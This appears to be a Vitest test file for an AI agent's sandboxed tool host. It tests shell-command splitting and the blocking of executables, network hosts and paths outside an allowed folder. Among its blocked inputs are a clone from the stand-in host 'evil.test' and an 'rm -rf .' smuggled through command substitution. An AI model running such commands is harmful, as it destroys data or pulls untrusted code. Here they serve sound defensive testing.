import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { Restrictions, makeRestriction, type RestrictKind } from '../src/restrict.js';
import { TOOL_SPECS, ToolHost, describeToolCall, extractSubstitutions, parseSearchResults, splitChainedCommands, splitCommand } from '../src/tools.js';
import { cleanTemp, collecting, exec, tempDir } from './helpers.js';

afterEach(cleanTemp);

const PAGE = `
<div class="result results_links results_links_deep web-result ">
  <h2 class="result__title">
    <a rel="nofollow" class="result__a" href="//duckduckgo.com/l/?uddg=https%3A%2F%2Fvitest.dev%2Fconfig%2F&amp;rut=abc">Configuring <b>Vitest</b> | Vitest</a>
  </h2>
  <a class="result__snippet" href="//duckduckgo.com/l/?uddg=https%3A%2F%2Fvitest.dev%2Fconfig%2F&amp;rut=abc">Learn how to <b>configure</b> &amp; run tests.</a>
</div>
<div class="result">
  <h2 class="result__title"><a rel="nofollow" class="result__a" href="https://example.org/direct">Direct</a></h2>
  <a class="result__snippet" href="https://example.org/direct">Second snippet</a>
</div>`;

/** A tool host limited to the given restrictions, as agents get it. */
const restricted = (cwd: string, ...limits: [RestrictKind, string][]): ToolHost =>
    new ToolHost(limits.reduce((all, [kind, value]) => all.with(makeRestriction(kind, value, cwd)), new Restrictions(cwd)), cwd);

describe('webSearch result parsing', () => {
    it('extracts titles, target URLs and snippets', () => {
        expect(parseSearchResults(PAGE)).toEqual([
            { title: 'Configuring Vitest | Vitest', url: 'https://vitest.dev/config/', snippet: 'Learn how to configure & run tests.' },
            { title: 'Direct', url: 'https://example.org/direct', snippet: 'Second snippet' },
        ]);
    });

    it('returns nothing for a page without results', () => {
        expect(parseSearchResults('<html><body>No results</body></html>')).toEqual([]);
    });
});

describe('shell command splitting and substitutions', () => {
    it('splits commands on &&, ||, |, ;, & while respecting quotes', () => {
        expect(splitChainedCommands('git status && git log')).toEqual(['git status', 'git log']);
        expect(splitChainedCommands('cat foo | grep bar')).toEqual(['cat foo', 'grep bar']);
        expect(splitChainedCommands('echo "a && b" ; ls')).toEqual(['echo "a && b"', 'ls']);
        expect(splitChainedCommands('cmd1 2>&1 | cmd2')).toEqual(['cmd1 2>&1', 'cmd2']);
    });

    it('splits one command into arguments, honoring quotes', () => {
        expect(splitCommand(`git commit  -m "two words" 'and more' ""`)).toEqual(['git', 'commit', '-m', 'two words', 'and more', '']);
        expect(splitCommand('   ')).toEqual([]);
        expect(() => splitCommand('echo "open')).toThrow(/unterminated quote/);
    });

    describe.skipIf(process.platform !== 'win32')('Windows dir switches under filesystem restrictions', () => {
        let cwd: string;
        let host: ToolHost;

        beforeEach(() => {
            cwd = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'spl-dir-')));
            fs.mkdirSync(path.join(cwd, 'nested'));
            fs.writeFileSync(path.join(cwd, 'nested', 'document.md'), 'source');
            const restrictions = new Restrictions(cwd).with(makeRestriction('fs', '.', cwd));
            host = new ToolHost(restrictions, cwd);
        });

        afterEach(() => fs.rmSync(cwd, { recursive: true, force: true }));

        it('allows recursive listing switches instead of interpreting /s as a root path', async () => {
            const output = await host.invoke('shell', { command: 'dir /s /b /a:-d' });
            expect(output.trim()).toBe(path.join(cwd, 'nested', 'document.md'));
        });

        it('allows switches in chained commands', async () => {
            const output = await host.invoke('shell', { command: 'dir /b && dir /s /b /a:-d' });
            expect(output).toContain(path.join(cwd, 'nested', 'document.md'));
        });

        it.each(['dir /s /b ../', 'dir /s /b /outside', 'dir /s /b > ../listing.txt'])(
            'still rejects paths outside the scope: %s', async (command) => {
                await expect(host.invoke('shell', { command })).rejects.toMatchObject({
                    statusCode: 'restriction_violation',
                    reason: expect.stringContaining(`shell command: ${JSON.stringify(command)}`),
                });
            },
        );

        it('does not treat /s as a switch for file tools', async () => {
            await expect(host.invoke('readFile', { path: '/s' })).rejects.toMatchObject({
                statusCode: 'restriction_violation',
            });
        });
    });

    it('extracts command substitutions', () => {
        expect(extractSubstitutions('echo $(git rev-parse HEAD)')).toEqual(['git rev-parse HEAD']);
        expect(extractSubstitutions('echo `cat file.txt`')).toEqual(['cat file.txt']);
        expect(extractSubstitutions('echo "literal $(not_in_single)"')).toEqual(['not_in_single']);
        expect(extractSubstitutions("echo '$(ignored)'")).toEqual([]);
    });
});

describe('built-in tools', () => {
    it('are named in camelCase, in their specifications and in what the log shows', () => {
        expect(Object.keys(TOOL_SPECS)).toEqual(['readFile', 'writeFile', 'webFetch', 'webSearch', 'shell']);
        for (const [name, spec] of Object.entries(TOOL_SPECS)) {
            expect(spec.name).toBe(name);
            expect(Object.keys(spec.properties)).toEqual(spec.required);
        }
        expect(describeToolCall('readFile', { path: 'src/a.ts' }, { output: 'const a = 1;\nconst b = 2;\n' }))
            .toEqual({ name: 'readFile', target: 'src/a.ts', status: 'success', source: 'const a = 1;\nconst b = 2;\n', language: 'typescript', summary: '2 lines' });
        expect(describeToolCall('writeFile', { path: 'out.md', content: '# Title\n' }, { output: 'Wrote 8 bytes' }))
            .toMatchObject({ name: 'writeFile', target: 'out.md', source: '# Title\n', summary: '1 line written' });
        expect(describeToolCall('webSearch', { query: 'vitest' }, { output: '1. A\n   https://a.test\n2. B\n   https://b.test' }))
            .toMatchObject({ name: 'webSearch', target: '"vitest"', summary: '2 results' });
        expect(describeToolCall('webFetch', { url: 'https://a.test' }, { error: 'webFetch: HTTP 500\nbody' }))
            .toMatchObject({ name: 'webFetch', target: 'https://a.test', status: 'error', summary: 'webFetch: HTTP 500' });
    });

    it('read and write files inside the allowed folder only, naming the tool in every error', async () => {
        const cwd = tempDir();
        fs.mkdirSync(path.join(cwd, 'out'));
        fs.writeFileSync(path.join(cwd, 'secret.txt'), 'hidden');
        const host = restricted(cwd, ['fs', './out']);
        const target = path.join(cwd, 'out', 'deep', 'note.txt');
        expect(await host.invoke('writeFile', { path: './out/deep/note.txt', content: 'héllo' })).toBe(`Wrote 6 bytes to ${target}`);
        expect(await host.invoke('readFile', { path: target })).toBe('héllo');
        await expect(host.invoke('readFile', { path: './secret.txt' })).rejects.toMatchObject({
            statusCode: 'restriction_violation', reason: `read of '${path.join(cwd, 'secret.txt')}' blocked: outside allowed folder(s) ${path.join(cwd, 'out')}`,
        });
        await expect(host.invoke('writeFile', { path: './out/../escape.txt', content: 'x' })).rejects.toMatchObject({ statusCode: 'restriction_violation' });
        expect(fs.existsSync(path.join(cwd, 'escape.txt'))).toBe(false);
        await expect(host.invoke('readFile', { path: './out/missing.txt' })).rejects.toMatchObject({
            statusCode: 'tool_error', reason: expect.stringMatching(/^readFile '\.\/out\/missing\.txt': ENOENT/),
        });
        await expect(host.invoke('readFile', { path: '' })).rejects.toMatchObject({ statusCode: 'tool_error', reason: "readFile: parameter 'path' must be a non-empty string" });
        await expect(host.invoke('writeFile', { path: './out/a.txt' })).rejects.toMatchObject({ statusCode: 'tool_error', reason: "writeFile: parameter 'content' must be a string" });
        await expect(host.invoke('webFetch', { url: 'ftp://example.com/a' })).rejects.toMatchObject({ statusCode: 'tool_error', reason: "unsupported URL scheme 'ftp:'" });
        await expect(host.invoke('shell', { command: '  ' })).rejects.toMatchObject({ statusCode: 'tool_error', reason: 'shell: empty command' });
    });

    it('shorten long content for models, but not for workflow code', async () => {
        const cwd = tempDir();
        const content = 'x'.repeat(200_010);
        fs.writeFileSync(path.join(cwd, 'long.txt'), content);
        expect(await restricted(cwd).invoke('readFile', { path: 'long.txt' })).toBe(`${'x'.repeat(200_000)}\n...[truncated 10 characters]`);
        expect(await new ToolHost(new Restrictions(cwd), cwd, true).invoke('readFile', { path: 'long.txt' })).toBe(content);
    });

    it('check every part of a shell command before running any of it', async () => {
        const cwd = tempDir();
        const marker = path.join(cwd, 'ran.txt');
        const host = restricted(cwd, ['exec', 'node, git'], ['net', 'example.com'], ['fs', '.']);
        const blocked = async (command: string): Promise<string> => {
            const error = await host.invoke('shell', { command }).catch(caught => caught);
            expect(error).toMatchObject({ statusCode: 'restriction_violation' });
            expect(error.reason).toContain(`(shell command: ${JSON.stringify(command)})`);
            return error.reason;
        };
        const touch = `node -e "require('node:fs').writeFileSync('ran.txt', '')"`;
        expect(await blocked(`${touch} && curl https://example.com`)).toContain("executable 'curl' blocked: allowed executables are node, git");
        expect(await blocked(`${touch} | ./node`)).toContain('must be named without a path');
        expect(await blocked(`${touch}; git clone https://evil.test/repo`)).toContain("network access to 'evil.test' blocked");
        expect(await blocked(`${touch}; git log --output=../log.txt`)).toContain('outside allowed folder(s)');
        expect(await blocked(`${touch} > ../out.txt`)).toContain(`write of '${path.join(path.dirname(cwd), 'out.txt')}' blocked`);
        expect(await blocked('git log $(rm -rf .)')).toContain("executable 'rm' blocked");
        expect(await blocked('git log "unterminated')).toContain('unterminated quote');
        expect(fs.existsSync(marker)).toBe(false);
        expect(await host.invoke('shell', { command: `${touch} && node -e "console.log(1 + 1)"` })).toBe('2\n');
        expect(fs.existsSync(marker)).toBe(true);
    });

    it('report their camelCase names from workflows, in failures and in the log', async () => {
        const cwd = tempDir();
        const { logger, events } = collecting();
        expect(await exec("await writeFile('note.txt', 'one\\ntwo');\nawait readFile('note.txt');\nawait readFile('missing.txt');", { cwd, logger })).toMatchObject({
            status: 'failure', failure: { status_code: 'tool_error', reason: expect.stringMatching(/^readFile 'missing\.txt': ENOENT/), line: 3, command: "await readFile('missing.txt');" },
        });
        expect(events.flatMap(event => event.kind === 'tool' ? [event.tool] : [])).toEqual([
            { name: 'writeFile', target: 'note.txt', status: 'success' },
            { name: 'readFile', target: 'note.txt', status: 'success' },
            { name: 'readFile', target: 'missing.txt', status: 'error' },
        ]);
    });
});
